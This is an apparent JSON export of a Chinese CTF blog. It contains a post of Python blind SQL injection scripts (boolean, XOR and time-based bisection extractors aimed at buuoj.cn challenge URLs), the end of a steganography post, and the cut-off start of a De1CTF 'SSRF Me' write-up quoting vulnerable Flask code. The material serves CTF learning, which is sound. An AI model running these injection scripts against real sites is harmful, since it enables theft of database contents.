data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvc3pNUGR2aUpXZ09qYjVyLnBuZw==\">https://i.loli.net/2021/08/26/szMPdviJWgOjb5r.png</span>&quot; alt=&quot;12.png&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;!--p12--&gt;</p>\n<p>仔细读能读到，也可用 StegSolve 反转读</p>\n<p blindwatermark1234>flag</p>\n<hr>\n<p>END</p>\n",
            "tags": [
                "随笔"
            ]
        },
        {
            "id": "http://example.com/2021/08/17/ctfweb-%E5%90%84%E7%A7%8D%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/",
            "url": "http://example.com/2021/08/17/ctfweb-%E5%90%84%E7%A7%8D%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/",
            "title": "ctfweb-各种盲注脚本",
            "date_published": "2021-08-17T13:51:59.954Z",
            "content_html": "<p>以下的几个脚本都是自己写的（有参考别的大佬），代码可能不是最精简，但是还算顺眼</p>\n<p>核心算法都是<strong>二分法</strong>，不推荐时间盲注（速度硬伤）</p>\n<p>脚本 payload 参考题目：[第一章 web 入门] SQL 注入 - 2  / 极客大挑战 finilysql（buuctf）</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"1通过post传参的脚本\"><a class=\"anchor\" href=\"#1通过post传参的脚本\">#</a> 1. 通过 post 传参的脚本</h1>\n<hr>\n<p>用的时候修改 post 参数和个数</p>\n<h2 id=\"11-基于异或盲注布尔盲注等\"><a class=\"anchor\" href=\"#11-基于异或盲注布尔盲注等\">#</a> 1.1 基于<strong>异或盲注</strong>，<strong>布尔盲注</strong>等：</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">'http://736aa374-b497-441f-9b6a-a1c91f9b182b.node4.buuoj.cn:81/login.php'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    high <span class=\"token operator\">=</span> <span class=\"token number\">127</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    low <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>low <span class=\"token operator\">+</span> high<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">while</span> high <span class=\"token operator\">></span> low<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\">#payload = f\"1' or ascii (substr (database (),&#123;i&#125;,1))>&#123;mid&#125;#\"    #查库</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token comment\">#payload = f\"1' or ascii (substr ((select (group_concat (table_name)) from (information_schema.tables) where (table_schema)='note'),&#123;i&#125;,1))>&#123;mid&#125;#\"   #查表</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\">#payload = f\"1' or ascii (substr ((select (group_concat (column_name)) from (information_schema.columns) where (table_name)='fl4g'),&#123;i&#125;,1))>&#123;mid&#125;#\"   #查列</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"1' or ascii(substr((seleCt(flag)from(fl4g)),</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">,1))></span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>mid<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">#\"</span></span>   <span class=\"token comment\">#查数据</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token string\">\"name\"</span><span class=\"token punctuation\">:</span>payload<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token string\">\"pass\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">'qwer'</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        response <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data <span class=\"token operator\">=</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">'u6216'</span> <span class=\"token keyword\">in</span> response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            low <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            high <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>low <span class=\"token operator\">+</span> high<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span>       </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">if</span> low <span class=\"token operator\">!=</span> <span class=\"token number\">32</span> <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        flag <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>low<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"12-基于时间盲注\"><a class=\"anchor\" href=\"#12-基于时间盲注\">#</a> 1.2 基于<strong>时间盲注</strong>：</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">'http://736aa374-b497-441f-9b6a-a1c91f9b182b.node4.buuoj.cn:81/login.php'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    high <span class=\"token operator\">=</span> <span class=\"token number\">127</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    low <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>low <span class=\"token operator\">+</span> high<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">while</span> high <span class=\"token operator\">></span> low<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token comment\">#payload = f\"1' or if (ascii (substr (database (),&#123;i&#125;,1))>&#123;mid&#125;,sleep (2),1)#\"       #查库名</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\">#payload = f\"1'or if (ascii (substr ((seleCt (group_concat (table_name)) from (information_schema.tables) where (table_schema)='note'),&#123;i&#125;,1))>&#123;mid&#125;,sleep (2),1)#\"        #查表名</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token comment\">#payload = f\"1'or if (ascii (substr ((seleCt (group_concat (column_name)) from (information_schema.columns) where (table_name)='users'),&#123;i&#125;,1))>&#123;mid&#125;,sleep (2),1)#\"        #查列名</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"1'or if(ascii(substr((seleCt(flag)from(fl4g)),</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">,1))></span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>mid<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">,sleep(2),1)#\"</span></span>       <span class=\"token comment\">#查数据</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token string\">\"name\"</span><span class=\"token punctuation\">:</span>payload<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token string\">\"pass\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">'qwer'</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span>        </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        last <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        response <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data <span class=\"token operator\">=</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        now <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">if</span> now <span class=\"token operator\">-</span> last <span class=\"token operator\">></span> <span class=\"token number\">1</span> <span class=\"token punctuation\">:</span>    </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            low <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">else</span> <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            high <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>low <span class=\"token operator\">+</span> high<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span> </pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">if</span> low <span class=\"token operator\">!=</span> <span class=\"token number\">32</span> <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        flag <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>low<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"2通过get传参的脚本\"><a class=\"anchor\" href=\"#2通过get传参的脚本\">#</a> 2. 通过 get 传参的脚本</h1>\n<hr>\n<p>修改 url 和 文本</p>\n<h2 id=\"21-基于异或盲注布尔盲注等\"><a class=\"anchor\" href=\"#21-基于异或盲注布尔盲注等\">#</a> 2.1 基于异或盲注，布尔盲注等：</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://d98fb290-369c-4ad8-8cd5-883846041dad.node4.buuoj.cn/search.php?id=\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>name <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token builtin\">min</span> <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token builtin\">max</span> <span class=\"token operator\">=</span> <span class=\"token number\">128</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token builtin\">min</span><span class=\"token operator\">&lt;</span><span class=\"token builtin\">max</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">min</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">max</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        payload<span class=\"token operator\">=</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"1^(ascii(substr(database(),</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">,1))></span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>mid<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">)#\"</span></span>       <span class=\"token comment\">#查库名</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token comment\">#payload=f\"1^(ascii (substr ((select (group_concat (table_name)) from (information_schema.tables) where (table_schema)='geek'),&#123;i&#125;,1))>&#123;mid&#125;)#\"        #查表名</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\">#payload=f\"1^(ascii (substr ((select (group_concat (column_name)) from (information_schema.columns) where (table_name)='F1naI1y'),&#123;i&#125;,1))>&#123;mid&#125;)#\"      #查列名</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token comment\">#payload=f\"1^(ascii (substr ((select (group_concat (password)) from (F1naI1y)),&#123;i&#125;,1))>&#123;mid&#125;)#\"       #查数据</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        response<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token operator\">+</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">'ERROR'</span> <span class=\"token keyword\">in</span> response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token builtin\">min</span> <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token builtin\">max</span><span class=\"token operator\">=</span>mid</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">min</span> <span class=\"token operator\">!=</span> <span class=\"token number\">32</span> <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        name <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">min</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"22-基于时间盲注\"><a class=\"anchor\" href=\"#22-基于时间盲注\">#</a> 2.2 基于时间盲注：</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> time </pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://d98fb290-369c-4ad8-8cd5-883846041dad.node4.buuoj.cn/search.php?id=\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>name <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token builtin\">min</span> <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token builtin\">max</span> <span class=\"token operator\">=</span> <span class=\"token number\">128</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token builtin\">min</span><span class=\"token operator\">&lt;</span><span class=\"token builtin\">max</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">min</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">max</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        payload<span class=\"token operator\">=</span><span class=\"token string-interpolation\"><span class=\"token string\">f\" \"</span></span>       <span class=\"token comment\">#查库名</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\">#payload=f\" \"        #查表名</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token comment\">#payload=f\" \"      #查列名</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token comment\">#payload=f\" \"       #查数据</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        last <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        response<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token operator\">+</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        now <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">if</span> now <span class=\"token operator\">-</span> last <span class=\"token operator\">></span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token builtin\">min</span> <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token builtin\">max</span><span class=\"token operator\">=</span>mid</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">min</span> <span class=\"token operator\">!=</span> <span class=\"token number\">32</span> <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        name <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">min</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"3备注\"><a class=\"anchor\" href=\"#3备注\">#</a> 3. 备注</h1>\n<p>1.payload 不放了，这个做题慢慢积累，网上也都有，根据题目自己写</p>\n<p>2. 能不使用 sleep 就不使用，速度比其他的方法慢太多</p>\n<p>3. 在网不好的情况下可能会出现脚本打印的字符错误，不是代码问题</p>\n<p>4. 自己写的脚本可能不完善，有问题或者有建议留言，有需求也可以自改</p>\n<p>5. 遇到新的脚本或者方法再补充</p>\n<hr>\n<p>END</p>\n",
            "tags": [
                "sql"
            ]
        },
        {
            "id": "http://example.com/2021/08/16/(ctfwp)py%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/",
            "url": "http://example.com/2021/08/16/(ctfwp)py%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/",
            "title": "(ctfwp)py代码审计",
            "date_published": "2021-08-16T12:35:41.221Z",
            "content_html": "<p>真服了，本来觉得代码审计真没啥考的，结果被 py 代码搞得头大，c</p>\n<p>我还是记录一下吧</p>\n<p><span id=\"more\"></span></p>\n<p>wp 大佬们都说简单，头真大，真搞心态，py 不行真是硬伤</p>\n<h1 id=\"1de1ctf-2019ssrf-me\"><a class=\"anchor\" href=\"#1de1ctf-2019ssrf-me\">#</a> 1.[De1CTF 2019]SSRF Me</h1>\n<hr>\n<p>说实话，ssrf 没咋考出来，全被代码审计坑了。。</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMTYvb3A4VmFHdVRYSDlSZ2NQLnBuZw==\">https://i.loli.net/2021/08/16/op8VaGuTXH9RgcP.png</span>&quot; alt=&quot;1.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p1--&gt;</p>\n<p>出个真是代码也不好好给，还得自己整理：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#! /usr/bin/env python</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># #encoding=utf-8</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> request</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> socket</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> hashlib</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> urllib</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">import</span> json</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token builtin\">reload</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sys<span class=\"token punctuation\">.</span>setdefaultencoding<span class=\"token punctuation\">(</span><span class=\"token string\">'latin1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>app <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>secert_key <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>urandom<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre> </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Task</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> action<span class=\"token punctuation\">,</span> param<span class=\"token punctuation\">,</span> sign<span class=\"token punctuation\">,</span> ip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        self<span class=\"token punctuation\">.</span>action <span class=\"token operator\">=</span> action</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        self<span class=\"token punctuation\">.</span>param <span class=\"token operator\">=</span> param</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        self<span class=\"token punctuation\">.</span>sign <span class=\"token operator\">=</span> sign</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        self<span class=\"token punctuation\">.</span>sandbox <span class=\"token operator\">=</span> md5<span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">not</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>exists<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>sandbox<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            os<span class=\"token punctuation\">.</span>mkdir<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>sandbox<span class=\"token punctuation\">)</span>          <span class=\"token comment\">#整个大类主要就是三个元素写的 action param sign</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre> </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">Exec</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        result <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        result<span class=\"token punctuation\">[</span><span class=\"token string\">'code'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">500</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>checkSign<span 